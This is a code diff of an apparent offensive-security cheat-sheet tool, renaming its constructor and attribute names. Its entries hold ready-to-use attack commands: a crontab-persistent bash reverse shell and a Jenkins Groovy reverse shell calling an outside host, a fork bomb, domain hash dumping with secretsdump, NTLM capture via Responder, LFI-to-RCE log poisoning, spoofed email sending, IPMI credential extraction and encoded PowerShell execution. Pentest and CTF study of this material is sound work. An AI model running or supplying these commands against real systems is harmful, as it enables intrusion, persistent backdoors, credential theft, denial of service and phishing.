+mp_cmd_exe = create_new_cheat("MpCmdRun.exe - Force Scan AntiVirus for Responder.py - AV - NTML")
 mp_cmd_exe.category = "Windows"
-mp_cmd_exe.subCategory = "PrivEsc"
+mp_cmd_exe.sub_category = "PrivEsc"
 mp_cmd_exe.output = """[*] MpCmdRun.exe - dedicated command-line tool of Microsoft Defender Antivirus
 
 # Prepare responder.py for catch NTML HASH
@@ -1812,9 +1802,9 @@ sudo responder.py -I tun0 --lm -v # for force get NTLMv1
 ######################################
 ######################################
 
-secredump = Cheat("secretsdump.py - ntds - ntlm - system - sam")
+secredump = create_new_cheat("secretsdump.py - ntds - ntlm - system - sam")
 secredump.category = "Tools"
-secredump.subCategory = "RPC"
+secredump.sub_category = "RPC"
 secredump.output = """[*] Get all hashes os all domain users
 
 secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
@@ -1823,9 +1813,9 @@ secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
 ######################################
 ######################################
 
-forkBomb = Cheat("Fork Bomb")
+forkBomb = create_new_cheat("Fork Bomb")
 forkBomb.category = "Linux"
-forkBomb.subCategory = "Utility"
+forkBomb.sub_category = "Utility"
 forkBomb.output = """[*] Fork Bomb - Creates processes until system "crashes"
 
 :(){:|:&};:
@@ -1834,9 +1824,9 @@ forkBomb.output = """[*] Fork Bomb - Creates processes until system "crashes"
 ######################################
 ######################################
 
-linuxPersistenceReverseShell = Cheat("Reverse Shell - Persistent Reverse Collectors")
+linuxPersistenceReverseShell = create_new_cheat("Reverse Shell - Persistent Reverse Collectors")
 linuxPersistenceReverseShell.category = "Linux"
-linuxPersistenceReverseShell.subCategory = "Reverse Shell"
+linuxPersistenceReverseShell.sub_category = "Reverse Shell"
 linuxPersistenceReverseShell.output = f"""[*] Persistent reverse shell backdoor via crontab
 
 (touch /dev/shm/.tab ; echo "* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/{ip}/443 0>&1'" >> /dev/shm/.tab ; crontab /dev/shm/.tab ; rm /dev/shm/.tab) > /dev/null 2>&1
@@ -1845,9 +1835,9 @@ linuxPersistenceReverseShell.output = f"""[*] Persistent reverse shell backdoor 
 ######################################
 ######################################
 
-connectDatabaseViaPHP = Cheat("php --interactive - connect to database via php - PDO connection")
+connectDatabaseViaPHP = create_new_cheat("php --interactive - connect to database via php - PDO connection")
 connectDatabaseViaPHP.category = "Tools"
-connectDatabaseViaPHP.subCategory = "Databases"
+connectDatabaseViaPHP.sub_category = "Databases"
 connectDatabaseViaPHP.output = """[*] php --interactive - connect to database via php when we have no mysql or similar in target machine
 
 php --interactive
@@ -1864,9 +1854,9 @@ php > print_r($results);
 ######################################
 ######################################
 
-sshPassInCMD = Cheat("sshpass - write password in command line on login with sshpass")
+sshPassInCMD = create_new_cheat("sshpass - write password in command line on login with sshpass")
 sshPassInCMD.category = "Tools"
-sshPassInCMD.subCategory = "Password"
+sshPassInCMD.sub_category = "Password"
 sshPassInCMD.output = """[*] sshpass - write password in command line on login with sshpass
 
 sshpass -p 'Passw0rd!' ssh clave@10.10.10.114
@@ -1875,9 +1865,9 @@ sshpass -p 'Passw0rd!' ssh clave@10.10.10.114
 ######################################
 ######################################
 
-winrmEnable = Cheat("Enable WinRM - Powershell")
+winrmEnable = create_new_cheat("Enable WinRM - Powershell")
 winrmEnable.category = "Windows"
-winrmEnable.subCategory = "WinRM"
+winrmEnable.sub_category = "WinRM"
 winrmEnable.output = """[*] Quick default configuration of WinRM
 
 winrm quickconfig
@@ -1893,9 +1883,9 @@ winrm quickconfig
 ######################################
 ######################################
 
-sendImpersonatedEmail = Cheat("email - send impersonated email with python")
+sendImpersonatedEmail = create_new_cheat("email - send impersonated email with python")
 sendImpersonatedEmail.category = "Python"
-sendImpersonatedEmail.subCategory = "Email"
+sendImpersonatedEmail.sub_category = "Email"
 sendImpersonatedEmail.output = """[*] Send an impersonated email via email
 
 sudo apt install sendmail
@@ -1932,9 +1922,9 @@ os.system("/etc/init.d/sendmail stop")
 ######################################
 ######################################
 
-jaula = Cheat("Sair da Jaula! Upgrade e estabilizar o shell")
+jaula = create_new_cheat("Sair da Jaula! Upgrade e estabilizar o shell")
 jaula.category = "Linux"
-jaula.subCategory = "Reverse Shell"
+jaula.sub_category = "Reverse Shell"
 jaula.output = """[*] Sair da Jaula! Upgrade e estabilizar o shell
 
 python3 -c 'import pty;pty.spawn("/bin/bash")'  # OR
@@ -1951,9 +1941,9 @@ stty rows 40 columns 170
 ######################################
 ######################################
 
-ret2libc = Cheat("ret2libc attack - BOF - Binary exploit - Linux")
+ret2libc = create_new_cheat("ret2libc attack - BOF - Binary exploit - Linux")
 ret2libc.category = "Linux"
-ret2libc.subCategory = "Reverse Engineering"
+ret2libc.sub_category = "Reverse Engineering"
 ret2libc.output = """[*] ret2libc (return to libc, or return to the C library) attack
 
 # Get offset with gdb
@@ -2029,9 +2019,9 @@ while True:
 ######################################
 ######################################
 
-pythonProxyBurp = Cheat("Python - Request via Burpsuite")
+pythonProxyBurp = create_new_cheat("Python - Request via Burpsuite")
 pythonProxyBurp.category = "Python"
-pythonProxyBurp.subCategory = "Requests"
+pythonProxyBurp.sub_category = "Requests"
 pythonProxyBurp.output = """[*] Python - Request via Burpsuite
 
 import requests
@@ -2045,9 +2035,9 @@ r = requests.get("https://www.google.com/", proxies=proxies, verify=False)
 ######################################
 ######################################
 
-updateWPPlugins = Cheat("Update wordlist of wp-plugins (WordPress)")
+updateWPPlugins = create_new_cheat("Update wordlist of wp-plugins (WordPress)")
 updateWPPlugins.category = "Web"
-updateWPPlugins.subCategory = "CMS"
+updateWPPlugins.sub_category = "CMS"
 updateWPPlugins.output = """[*] Update wordlist of wp-plugins for discover plugins with ffuf
 
 # The default location of plugins in wordpress is http://site.com/wp-content/plugins/<pluginName>
@@ -2060,9 +2050,9 @@ for i in $(seq 1 1757); do curl https://github.com/orgs/wp-plugins/repositories?
 ######################################
 ######################################
 
-rsaDecrypt = Cheat("RSA Decrypt")
+rsaDecrypt = create_new_cheat("RSA Decrypt")
 rsaDecrypt.category = "Tools"
-rsaDecrypt.subCategory = "Password"
+rsaDecrypt.sub_category = "Password"
 rsaDecrypt.output = """[*] Decrypt RSA keys
 
 # GOOGLE: RSA step by step decrypt - cryptool portal
@@ -2072,9 +2062,9 @@ rsaDecrypt.output = """[*] Decrypt RSA keys
 ######################################
 ######################################
 
-openPortsForDontAskSudoAllTime = Cheat("Unrestrict ports for use all ports under 1000 without sudo privilege")
+openPortsForDontAskSudoAllTime = create_new_cheat("Unrestrict ports for use all ports under 1000 without sudo privilege")
 openPortsForDontAskSudoAllTime.category = "Kali"
-openPortsForDontAskSudoAllTime.subCategory = "Configurations"
+openPortsForDontAskSudoAllTime.sub_category = "Configurations"
 openPortsForDontAskSudoAllTime.output = """[*] remove all privileged ports on linux
 
 #save configuration permanently
@@ -2082,9 +2072,9 @@ echo 'net.ipv4.ip_unprivileged_port_start=0' > /etc/sysctl.d/50-unprivileged-por
 #apply conf
 sysctl --system
 """
-sendImpersonatedEmailViaCli = Cheat("email - send impersonated email with swaks (CLI)")
+sendImpersonatedEmailViaCli = create_new_cheat("email - send impersonated email with swaks (CLI)")
 sendImpersonatedEmailViaCli.category = "Tools"
-sendImpersonatedEmailViaCli.subCategory = "Email"
+sendImpersonatedEmailViaCli.sub_category = "Email"
 sendImpersonatedEmailViaCli.output = """[*] Send an impersonated email via swaks (CLI)
 
 # Installation
@@ -2098,9 +2088,9 @@ swaks --from "javali@sneakycorp.htb" --to "airisatou@sneakymailer.htb,angelicara
 ######################################
 ######################################
 
-logPoisonning = Cheat("Log Poisoning")
+logPoisonning = create_new_cheat("Log Poisoning")
 logPoisonning.category = "Web"
-logPoisonning.subCategory = "RCE"
+logPoisonning.sub_category = "RCE"
 logPoisonning.output = """[*] Transforme a LFI into a RCE
 
 # https://www.thehacker.recipes/web/inputs/file-inclusion
@@ -2121,9 +2111,9 @@ logPoisonning.output = """[*] Transforme a LFI into a RCE
 ######################################
 ######################################
 
-WordpressTrics = Cheat("Wordpress - Importante Files")
+WordpressTrics = create_new_cheat("Wordpress - Importante Files")
 WordpressTrics.category = "Web"
-WordpressTrics.subCategory = "CMS"
+WordpressTrics.sub_category = "CMS"
 WordpressTrics.output = """[*] Wordpress - Importante Files
 
 # Logs
@@ -2142,9 +2132,9 @@ WordpressTrics.output = """[*] Wordpress - Importante Files
 ######################################
 ######################################
 
-snmpcheck = Cheat("snmp-check - 161 - SNMP Enumerator")
+snmpcheck = create_new_cheat("snmp-check - 161 - SNMP Enumerator")
 snmpcheck.category = "Tools"
-snmpcheck.subCategory = "SNMP"
+snmpcheck.sub_category = "SNMP"
 snmpcheck.output = """[*] snmp-check - 161 - SNMP Enumerator
 
 snmp-check [OPTIONS] <target IP address>
@@ -2156,9 +2146,9 @@ snmp-check [OPTIONS] <target IP address>
 ######################################
 ######################################
 
-ipmipwner = Cheat("ipmiPwner - UDP 623")
+ipmipwner = create_new_cheat("ipmiPwner - UDP 623")
 ipmipwner.category = "Tools"
-ipmipwner.subCategory = "IPMI"
+ipmipwner.sub_category = "IPMI"
 ipmipwner.output = """[*] ipmiPwner - UDP 623 - Tool for exploit ipmi service to get credentials
 # Intelligent Platform Management Interface (IPMI) is one of the most used acronyms in server management. 
 # IPMI became popular due to its acceptance as a standard monitoring interface by hardware vendors and developers.
@@ -2178,9 +2168,9 @@ python3 ipmipwner.py --host 192.168.1.12 -p 624 -uW /opt/SecLists/Usernames/cirt
 ######################################
 ######################################
 
-jenkinsRCE = Cheat("JenkinsRCE with Script Groovy")
+jenkinsRCE = create_new_cheat("JenkinsRCE with Script Groovy")
 jenkinsRCE.category = "Web"
-jenkinsRCE.subCategory = "RCE"
+jenkinsRCE.sub_category = "RCE"
 jenkinsRCE.output = """[*] Execute command remotely with Script Groovy via Jenkins
 # or String cmd="/bin/bash";
 String host="10.10.10.120";
@@ -2192,9 +2182,9 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 ######################################
 ######################################
 
-youtubeToMP3 = Cheat("Youtube to MP3")
+youtubeToMP3 = create_new_cheat("Youtube to MP3")
 youtubeToMP3.category = "Linux"
-youtubeToMP3.subCategory = "Music"
+youtubeToMP3.sub_category = "Music"
 youtubeToMP3.output = """[*] Simple download music from a Youtube video
 sudo apt install youtube-dl
 youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=IWy9mO-TjNw
@@ -2205,9 +2195,9 @@ youtube-dl --extract-audio --audio-format mp3 https://www.youtube.com/watch?v=IW
 ######################################
 ######################################
 
-powershell_enc = Cheat("PowerShell exec code in base64")
+powershell_enc = create_new_cheat("PowerShell exec code in base64")
 powershell_enc.category = "Windows"
-powershell_enc.subCategory = "PowerShell"
+powershell_enc.sub_category = "PowerShell"
 powershell_enc.output = f"""[*] PowerShell execute code in base64 for easy control bad chars on webexploit
 
 # Create the string for windows in 16bytes little endian
